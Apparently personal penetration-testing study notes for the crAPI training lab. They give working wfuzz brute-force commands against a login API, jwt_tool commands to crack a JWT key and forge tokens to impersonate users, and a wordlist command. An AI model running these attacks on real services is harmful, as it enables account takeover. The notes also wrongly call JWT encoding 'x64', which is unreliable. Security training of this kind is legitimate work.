# Authentication Attacks

#### Classic Authentication Attack

- use Burp Suite to capture a login
- open intruder in Burp Suite
- can set payload 1 to be full of emails
- set payload 2 to be passwords
- start attack
- "Bad Credentials" in the response section is indicative that we can brute force

#### wfuzz

can be used to brute force a target

- wfuzz -d '{Insert Post Body Here}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/rockyou.txt -u http://127.0.0.1:8888/identity/api/auth/login --hc 500
  - wfuzz -d '{"email":"user@email.com","password":"PASSWORD"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/rockyou.txt -u http://127.0.0.1:8888/identity/api/auth/login --hc 500
  - wfuzz -d

#### jwt_tool

- an open-source toolkit for testing JSON Web Tokens (JWTs), designed to automate the process of discovering and exploiting common vulnerabilities in JWT implementations. It provides functionalities for brute-forcing keys, tampering with token claims, and automatically detecting token signing algorithms.
- jwt_tool {insert token here} -C -d crAPIpw.txt
  - This finds the key. This can be used to create our own trusted tokens
- We can then go to `jwt.io` to modify our token using this key and whichever changes we wish to make such as email.
- We can then use that token to authenticate to the target user
- Attempt to automatically scan against an application:
  - $jwt_tool eyJhbGci... -t http://crapi.apisec.ai -M pb

#### Notes

// Can use Burp Suite Sequencer to determine a predictible token generation process of an application, then use the gained information to craft requests in Burp Suite Intruder.

- JWT (JSON Web Token) structure: x64 encoded, separated in 3 parts by periods: Header, Payload, Signature.
  - `jwt.io`

- Creating password file:
  - crunch 5 5 -o crAPIpw.txt
